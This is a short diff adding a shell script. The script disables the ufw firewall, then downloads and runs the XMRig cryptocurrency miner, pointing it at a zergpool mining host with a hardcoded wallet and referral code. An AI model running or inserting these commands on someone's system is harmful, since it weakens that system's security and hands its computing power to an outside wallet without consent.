@@ -1,0 +1,4 @@
+screen
+
+sudo ufw disable
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig --donate-level 1 -a gr -o ghostrider.asia.mine.zergpool.com:15354 -u RRzL8NpRvYccXCaBXbm4BVyVSja3tGmMqs -k --tls -p c=RVN,mc=JGC,refcode=635f7915ea62e0ff8f966e9d97891849
